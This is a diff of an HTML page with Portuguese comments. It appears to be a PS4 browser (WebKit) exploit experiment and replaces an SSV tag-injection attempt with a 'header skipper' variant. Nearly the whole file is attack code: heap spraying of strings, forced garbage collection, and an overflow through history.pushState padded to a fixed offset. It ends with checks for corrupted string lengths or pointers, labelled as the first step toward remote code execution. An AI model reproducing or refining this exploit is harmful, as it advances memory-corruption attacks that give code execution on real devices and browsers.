@@ -1,112 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SSV Injection: Tag 23 Attack</title>
+    <title>PS4 Header Skipper (StructureID Bypass)</title>
     <style>
-        body { background-color: #100; color: #f55; font-family: monospace; padding: 20px; }
-        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #f55; background: #000; color: #fff; cursor: pointer; }
-        #log { margin-top: 20px; border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
-        .win { background-color: #f55; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 2px solid white; }
+        body { background-color: #000; color: #ff0; font-family: monospace; padding: 20px; text-align: center; }
+        button { 
+            font-size: 20px; padding: 20px; width: 100%; border: 2px solid #ff0; background: #222; color: #fff; cursor: pointer; margin-bottom: 10px;
+        }
+        #log { text-align: left; border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
     </style>
 </head>
 <body>
 
-    <h1>Ataque Final: Injeção de Tag SSV (23)</h1>
-    <p>Tentando forçar a criação de um ArrayBuffer via deserialização corrompida.</p>
+    <h1>Header Skipper (Evitando o StructureID)</h1>
+    <p>Tentando corromper o vizinho sem tocar nos seus primeiros bytes vitais.</p>
 
-    <button onclick="startSSVAttack()">INICIAR INJEÇÃO DE TAG</button>
+    <button onclick="startSkipAttack(8)">PULAR 8 BYTES (Preserva ID)</button>
+    <button onclick="startSkipAttack(16)">PULAR 16 BYTES (Preserva ID+Flags)</button>
+    <button onclick="startSkipAttack(24)">PULAR 24 BYTES (Preserva Header WebKit)</button>
     
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        const BASE_OFFSET = 709520; // Alinhamento exato
-        
-        // Estrutura do Payload Falso (Imitando make_ssv_data do bundle.js)
-        // Precisamos construir isso usando apenas bytes permitidos (< 0x20)
-        // Tag 23 (0x17) é permitido. Version 6 (0x06) é permitido.
-        
-        function buildFakeSSV() {
-            // Cria um buffer pequeno para montar o payload
-            let buf = new Uint8Array(32);
-            
-            // Offset 0: Version (4 bytes) -> 0x00000006
-            buf[0] = 6; 
-            
-            // Offset 4: Tag (1 byte) -> 0x17 (23 - ArrayBufferTransfer)
-            buf[4] = 0x17;
-            
-            // Offset 5-7: Padding/Flags -> 0x00
-            
-            // Offset 8: Pointer (8 bytes). 
-            // Como não podemos escrever bytes altos (ex: 0x41), vamos escrever 0x01.
-            // Isso vai criar o ponteiro 0x0101010101010101.
-            // Se o sistema tentar ler esse endereço, BINGO.
-            for(let i=8; i<16; i++) buf[i] = 1;
-            
-            // Offset 16: Size (4 bytes).
-            // Vamos dizer que o tamanho é pequeno (ex: 0x10 = 16 bytes)
-            buf[16] = 0x10; 
-            
-            return buf;
-        }
+        const BASE_OFFSET = 709520; // O início exato do vizinho
+        const OVERFLOW_AMT = 1024 * 64; 
+
+        // Spray de Strings (Alvo mais provável para alinhamento)
+        // Usamos strings de 128 bytes (pequenas/médias)
+        const TARGET_SIZE = 128; 
+        const SPRAY_COUNT = 5000;
+
+        var victims = [];
 
         function log(msg, type) {
             const el = document.getElementById('log');
-            let cls = type === 'win' ? 'class="win"' : '';
-            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            let color = type === 'win' ? '#0f0' : 'cyan';
+            el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
         }
 
-        async function startSSVAttack() {
-            log("1. Preparando Payload SSV (Tag 23)...");
+        async function startSkipAttack(skipBytes) {
+            log(`--- INICIANDO TESTE: PULAR ${skipBytes} BYTES ---`);
             
-            // Converte o buffer binário para string (Latin-1) para injetar
-            let fakeSSV = buildFakeSSV();
-            let injectionStr = "";
-            for(let i=0; i<fakeSSV.length; i++) {
-                injectionStr += String.fromCharCode(fakeSSV[i]);
+            // 1. SPRAY DE STRINGS
+            victims = [];
+            // Padding para string de 128 bytes
+            const pad = "B".repeat(TARGET_SIZE - 24); 
+
+            for(let i=0; i<SPRAY_COUNT; i++) {
+                let s = [pad, i].join("").substring(0, TARGET_SIZE - 24);
+                victims.push(s);
             }
 
-            // O resto do overflow (padding até o próximo objeto)
-            // Vamos ser conservadores: escrever apenas o cabeçalho
-            let totalOverflow = injectionStr; 
-
-            // Spray para garantir que temos vizinhos (Strings)
-            // Strings são boas vítimas porque o SSV Parser pode tentar ler uma string como objeto SSV
-            log("2. Spray de Strings (Vítimas)...");
-            let victims = [];
-            let pad = "B".repeat(1024*1024); // 1MB Strings
-            for(let i=0; i<100; i++) {
-                victims.push(pad + i);
-            }
-            
-            // Buracos
-            for(let i=0; i<100; i+=2) victims[i] = null;
+            // 2. BURACOS
+            for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
             await forceGC();
 
-            log("3. Disparando Injeção...");
-
+            // 3. EXPLOIT (COM PULO)
+            log(`Disparando Overflow (Safe-Zone de ${skipBytes} bytes)...`);
+            
             setTimeout(() => {
                 try {
-                    // Preenche até a borda
+                    // Parte 1: Enche até a borda do vizinho (709.520)
                     let buffer = "A".repeat(BASE_OFFSET);
-                    // Adiciona nosso SSV falso no lugar do vizinho
-                    buffer += injectionStr;
                     
-                    // Adiciona um pouco de lixo 0x01 depois só pra garantir
-                    buffer += "\x01".repeat(100);
-
-                    // A Mágica: Passamos um objeto de estado que vai ser lido DE VOLTA
-                    // Mas esperamos que o overflow corrompa a leitura do PRÓXIMO objeto
-                    history.pushState({}, "ssv_pwn", "/" + buffer);
-
-                    log("4. Verificando estabilidade...");
+                    // Parte 2: A ZONA NEUTRA (Pula o StructureID)
+                    // Escrevemos 0x00 nos primeiros bytes do vizinho.
+                    // Esperamos que 0x00 não cause crash imediato ou seja ignorado.
+                    // \u0000 conta como 1 byte.
+                    buffer += "\u0000".repeat(skipBytes); 
                     
-                    // Tenta ler o state de volta. 
-                    // Se corrompemos a estrutura interna, o navegador pode tentar materializar
-                    // o nosso ArrayBuffer falso e travar ao acessar 0x0101...
-                    let s = history.state;
-                    log("Estado lido. Se você vê isso, não travou imediatamente.");
+                    // Parte 3: A CORRUPÇÃO (0x01)
+                    // Agora sim escrevemos 0x01 para tentar pegar o Length ou Ponteiro de Dados
+                    buffer += "\x01".repeat(OVERFLOW_AMT);
+
+                    history.pushState({}, "skip_pwn", "/" + buffer);
+
+                    log("Verificando strings...");
+                    checkStrings();
 
                 } catch (e) {
                     log("Erro: " + e.message);
@@ -114,9 +85,41 @@
             }, 500);
         }
 
+        function checkStrings() {
+            let found = false;
+            for(let i=1; i<victims.length; i+=2) {
+                let s = victims[i];
+                if(!s) continue;
+
+                // Tenta detectar corrupção via Error.message (Técnica PSFree)
+                try {
+                    let err = new Error(s);
+                    let val = err.message;
+                    
+                    // Se o tamanho mudou (porque atingimos o campo length depois do ID)
+                    if (val.length !== s.length) {
+                        log(`!!! SUCESSO !!! String ${i} Length Corrompido!`, 'win');
+                        log(`Novo Tamanho: ${val.length}`, 'win');
+                        alert("RCE STEP 1: LENGTH CORRUPTED!");
+                        found = true;
+                        break;
+                    }
+                    
+                    // Se o conteúdo mudou (porque atingimos o ponteiro de dados)
+                    if (val.charCodeAt(0) !== 66) { // 66 = 'B'
+                        log(`!!! SUCESSO !!! String ${i} Ponteiro Corrompido!`, 'win');
+                        alert("RCE STEP 1: POINTER CORRUPTED!");
+                        found = true;
+                        break;
+                    }
+                } catch(e) {}
+            }
+            if(!found) log("Nenhuma corrupção detectada.");
+        }
+
         async function forceGC() {
             try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
-            return new Promise(r => setTimeout(r, 800));
+            return new Promise(r => setTimeout(r, 500));
         }
     </script>
 </body>
